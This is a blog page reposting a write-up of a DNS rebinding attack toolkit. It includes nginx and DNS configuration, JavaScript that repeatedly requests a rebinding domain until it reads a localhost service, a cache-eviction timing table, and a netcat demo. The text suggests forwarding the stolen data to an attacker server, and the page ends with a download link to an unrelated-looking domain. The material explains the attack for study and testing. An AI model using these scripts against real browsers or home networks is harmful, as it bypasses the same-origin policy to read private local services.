@@ -1,0 +1,194 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Kang Asu
+DNS Rebinding Tool - DNS Rebind Tool With Custom Scripts
+Inspired by @tavisio
+This project is meant to be an All-in-one Toolkit to test further DNS rebinding attacks and my take on understanding these kind of attacks. It consists of a web server and pseudo DNS server that only responds to A queries.
+The root index of the web server allowes to configure and run the attack with a rudimentary web gui."><title>DNS Rebinding Tool</title><link rel=canonical href=https://Nexus-Security.github.io/posts/2016-09-09-dns-rebinding-tool/><link rel=stylesheet href=/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css><meta property="og:title" content="DNS Rebinding Tool"><meta property="og:description" content="Kang Asu
+DNS Rebinding Tool - DNS Rebind Tool With Custom Scripts
+Inspired by @tavisio
+This project is meant to be an All-in-one Toolkit to test further DNS rebinding attacks and my take on understanding these kind of attacks. It consists of a web server and pseudo DNS server that only responds to A queries.
+The root index of the web server allowes to configure and run the attack with a rudimentary web gui."><meta property="og:url" content="https://Nexus-Security.github.io/posts/2016-09-09-dns-rebinding-tool/"><meta property="og:site_name" content="ZYChimne"><meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:published_time" content="2019-10-26T06:16:00+01:00"><meta property="article:modified_time" content="2019-10-26T06:16:00+01:00"><meta name=twitter:title content="DNS Rebinding Tool"><meta name=twitter:description content="Kang Asu
+DNS Rebinding Tool - DNS Rebind Tool With Custom Scripts
+Inspired by @tavisio
+This project is meant to be an All-in-one Toolkit to test further DNS rebinding attacks and my take on understanding these kind of attacks. It consists of a web server and pseudo DNS server that only responds to A queries.
+The root index of the web server allowes to configure and run the attack with a rudimentary web gui."></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu8b78332b6420dc9affabe23720d11e63_1937019_300x0_resize_q75_box.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
+<span class=emoji>🍇</span></figure><div class=site-meta><h1 class=site-name><a href=/>ZYChimne</a></h1><h2 class=site-description>Computer Science, Wuhan University</h2></div></header><ol class=social-menu><li><a href=https://github.com/ZYChimne target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com/ZChimne target=_blank title=Twitter><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>Home</span></a></li><li><a href=/about-me/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>About Me</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><div class=menu-bottom-section><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/posts/2016-09-09-dns-rebinding-tool/>DNS Rebinding Tool</a></h2></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Oct 26, 2019</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>5 minute read</time></div></footer></div></header><section class=article-content><p><strong>Kang Asu</strong></p><p><a class=link href=https://1.bp.blogspot.com/-LlrKm5aBsWA/XaaoDkPbNjI/AAAAAAAABv0/Y-og2xDVCNY6yRtQ-K7odJylTphSSaayACLcBGAsYHQ/s1600/DNS%2BRebinding%2BAttack%2BTool.png target=_blank rel=noopener><img src=https://1.bp.blogspot.com/-LlrKm5aBsWA/XaaoDkPbNjI/AAAAAAAABv0/Y-og2xDVCNY6yRtQ-K7odJylTphSSaayACLcBGAsYHQ/s320/DNS%2BRebinding%2BAttack%2BTool.png loading=lazy></a></p><p><strong>DNS Rebinding Tool - DNS Rebind Tool With Custom Scripts</strong></p><p>Inspired by <a class=link href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1471&desc=3" title=@tavisio target=_blank rel=noopener>@tavisio</a><br>This project is meant to be an All-in-one <a class=link href=https://www.kitploit.com/search/label/Toolkit title=Toolkit target=_blank rel=noopener>Toolkit</a> to test further <a class=link href=https://en.wikipedia.org/wiki/DNS_rebinding title="DNS  rebinding attacks" target=_blank rel=noopener>DNS rebinding attacks</a> and my take on understanding these kind of attacks. It consists of a web server and pseudo DNS server that only responds to A queries.</p><p>The root index of the web server allowes to configure and run the attack with a rudimentary web gui. See <a class=link href=http://dnsrebindtool.43z.one/ title=dnsrebindtool.43z.one target=_blank rel=noopener>dnsrebindtool.43z.one</a>.<br>A basic nginx config to host the web server</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>server {  
+</span></span><span class=line><span class=cl>  listen 80;  
+</span></span><span class=line><span class=cl>  server_name dnsrebindtool.43z.one;  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  location / {  
+</span></span><span class=line><span class=cl>    proxy_pass [http://localhost:5000](http://localhost:5000/);  
+</span></span><span class=line><span class=cl>  }  
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>The /attack route of the web server reads the GET parameter <code>script</code> that should provide basic64 encoded javascript and responds with the decoded code (wraped around a setTimeout) embeded in a regular HTML page.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>% curl &#34;[http://dnsrebindtool.43z.one/attack?script=YWxlcnQoMSk=](http://dnsrebindtool.43z.one/attack?script=YWxlcnQoMSk=)&#34;   
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>    &lt;br /&gt;&lt;br /&gt;    setTimeout(function(){&lt;br /&gt;      alert(1) &lt;br /&gt;    }, 3000)&lt;br /&gt;&lt;br /&gt; 
+</span></span></code></pre></td></tr></table></div></div><p><code>Within my registrar for the domain 43z.one I setup a NS record for the subdomain `rebind` to point to the IP where this tool is hosted.</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>`ns       A   81.4.124.10  
+</span></span><span class=line><span class=cl>rebind   NS  ns.43z.one`
+</span></span></code></pre></td></tr></table></div></div><p><code>The DNS server responds only to A queries in this format `evcmxfm4g . 81-4-124-10 . 127-0-0-1 .rebind.43z.one` The first part (subdomain) is just some random id and should be generated for every attack session (the web gui does this on every reload). Second comes the IP the DNS server should respond for the next 2 seconds and third the IP the server should respond after that time is passed.</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>`$ date &amp;&amp; nslookup -type=a evcmxfm4b.81-4-124-10.127-0-0-1.rebind.43z.one   
+</span></span><span class=line><span class=cl>Fri Feb  2 21:18:20 CET 2018  
+</span></span><span class=line><span class=cl>Server:   8.8.8.8  
+</span></span><span class=line><span class=cl>Address:  8.8.8.8#53  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>Non-authoritative answer:  
+</span></span><span class=line><span class=cl>Name: evcmxfm4b.81-4-124-10.127-0-0-1.rebind.43z.one  
+</span></span><span class=line><span class=cl>Address: 81.4.124.10  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>$ date &amp;&amp; nslookup -type=a evcmxfm4b.81-4-124-10.127-0-0-1.rebind.43z.one  
+</span></span><span class=line><span class=cl>Fri Feb  2 21:18:23 CET 2018  
+</span></span><span class=line><span class=cl>Server:   8.8.8.8  
+</span></span><span class=line><span class=cl>Address:  8.8.8.8#53  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>Non-authoritative answer:  
+</span></span><span class=line><span class=cl>Name: evcmxfm4b.81-4-124-10.127-0-0-1.rebind.43z.one  
+</span></span><span class=line><span class=cl>Address: 127.0.0.1`
+</span></span></code></pre></td></tr></table></div></div><p><code>The last missing peace is a nginx config for the rebind domains. Only the /attack route should be passed to the tool others should respond with an error. This allows to attack other services on port 80 with all routes but /attack. (like /api/monitoring/stats a endpoint my [router](https://www.kitploit.com/search/label/Router "router") exposes)</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>`server {  
+</span></span><span class=line><span class=cl>  listen 80;  
+</span></span><span class=line><span class=cl>  server_name *.rebind.43z.one;  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  location / {  
+</span></span><span class=line><span class=cl>    return 404;  
+</span></span><span class=line><span class=cl>  }  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  location /attack {  
+</span></span><span class=line><span class=cl>    proxy_pass [http://localhost:5000/attack](http://localhost:5000/attack);  
+</span></span><span class=line><span class=cl>  }  
+</span></span><span class=line><span class=cl>}`
+</span></span></code></pre></td></tr></table></div></div><p><code>DNS Cache Eviction</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>`var xhr = new XMLHttpRequest()  
+</span></span><span class=line><span class=cl>xhr.open(&#39;GET&#39;, &#39;czg9g2olz.81-4-124-10.127-0-0-1.rebind.43z.one&#39;, false)  
+</span></span><span class=line><span class=cl>xhr.send()  
+</span></span><span class=line><span class=cl>// first time the browser sees this domain it queries the dns server  
+</span></span><span class=line><span class=cl>// and gets 81.4.124.10  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>// sleep for more than 2 sec  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>xhr.open(&#39;GET&#39;, &#39;czg9g2olz.81-4-124-10.127-0-0-1.rebind.43z.one&#39;, false)  
+</span></span><span class=line><span class=cl>xhr.send()  
+</span></span><span class=line><span class=cl>// still uses 81.4.124.10 (AND NOT 127.0.0.1)  
+</span></span><span class=line><span class=cl>// NO dns query happened browser used cached IP`
+</span></span></code></pre></td></tr></table></div></div><p><code>This is a problem for this kind of attack. In order to work the browser has to reissue a new dns query to get the second IP. In theory if you just wait long enough between the requests a new query should happen. My tests show though there is a faster but more aggressive approach. It could be very likely this is setup specific. Needs more testing I used the following script to measure the optimum value for the WAIT variable. Tested on Chromium 62.0.3202.89 running on [Debian](https://www.kitploit.com/search/label/Debian "Debian") buster/sid.</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>`var WAIT = 200  
+</span></span><span class=line><span class=cl>var start = Date.now()  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>var interval = setInterval(function(){  
+</span></span><span class=line><span class=cl>  var xhr = new XMLHttpRequest()  
+</span></span><span class=line><span class=cl>  xhr.open(&#39;GET&#39;, &#39;//&#39; + $REBIND_DOMAIN, false)  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  xhr.send()  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  if(xhr.status == 200){  
+</span></span><span class=line><span class=cl>    document.body.innerHTML = (Date.now() - start)/1000  
+</span></span><span class=line><span class=cl>    document.body.innerHTML += xhr.responseText  
+</span></span><span class=line><span class=cl>    clearInterval(interval)  
+</span></span><span class=line><span class=cl>    return  
+</span></span><span class=line><span class=cl>  }  
+</span></span><span class=line><span class=cl>}, WAIT)`
+</span></span></code></pre></td></tr></table></div></div><p>WAIT value in ms</p><p>requests chrome sends</p><p>Time until queries dns again</p><p>0</p><p>700</p><p>60</p><p>10</p><p>700</p><p>60</p><p>100</p><p>600</p><p>63</p><p>120</p><p>500</p><p>63</p><p>150</p><p>400</p><p>63</p><p>180</p><p>400</p><p>75</p><p>200</p><p>300</p><p>63</p><p>220</p><p>300</p><p>69</p><p>250</p><p>300</p><p>78</p><p>280</p><p>300</p><p>87</p><p>300</p><p>200</p><p>63</p><p>320</p><p>200</p><p>67</p><p>340</p><p>200</p><p>71</p><p>360</p><p>200</p><p>75</p><p>380</p><p>200</p><p>79</p><p>400</p><p>200</p><p>83</p><p>1000</p><p>100</p><p>103</p><p><code>I started a new repo just to explore this [dns cache eviction tester](https://github.com/h43z/dns-cache-eviction "dns cache eviction tester") Putting it all together and test it.</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>`echo -e &#34;HTTP/1.1 200 OK\n\n TOPSECRET&#34; | sudo nc -lvp 80 -q1 127.0.0.1`
+</span></span></code></pre></td></tr></table></div></div><p><code>This [netcat](https://www.kitploit.com/search/label/Netcat "netcat") instance serves some content I would like to get access to. I keep the default rebind domain `$RANDOM$.81-4-124-10.127-0-0-1.rebind.43z.one` and default script</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>`var start = Date.now()  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>var interval = setInterval(function(){  
+</span></span><span class=line><span class=cl>  var xhr = new XMLHttpRequest()  
+</span></span><span class=line><span class=cl>  xhr.open(&#39;GET&#39;, &#39;//&#39; + $REBIND_DOMAIN, false)  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  xhr.send()  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  if(xhr.status == 200){  
+</span></span><span class=line><span class=cl>    document.body.innerHTML = (Date.now() - start)/1000  
+</span></span><span class=line><span class=cl>    document.body.innerHTML += xhr.responseText  
+</span></span><span class=line><span class=cl>    clearInterval(interval)  
+</span></span><span class=line><span class=cl>    return  
+</span></span><span class=line><span class=cl>  }  
+</span></span><span class=line><span class=cl>}, 200)`
+</span></span></code></pre></td></tr></table></div></div><p>``on <a class=link href=http://dnsrebindtool.43z.one/ title=dnsrebindtool.43z.one target=_blank rel=noopener>dnsrebindtool.43z.one</a> and hit the Attack button. Open the dev tools network tab to see what is happening in the background. For me after about 60 seconds fills up with the string <code>TOPSECRET</code> and the time it took. DNS rebinding circumvented <a class=link href=https://en.wikipedia.org/wiki/Same-origin_policy title=SOP target=_blank rel=noopener>SOP</a>. To get the breached data out of the iframe one could use <a class=link href=https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage title=Window.PostMessage() target=_blank rel=noopener>Window.PostMessage()</a> or include code that forwards the data to another attacker server within the script itself.</p><p>``</p><p><code>**[Download Dns-Rebinding-Tool](http://eunsetee.com/Vudk "Download Dns-Rebinding-Tool")**</code></p><p><code>** Regards**</code></p><p><code>**Kang Asu**</code></p></section><footer class=article-footer><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2022 ZYChimne</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.11.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
+<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
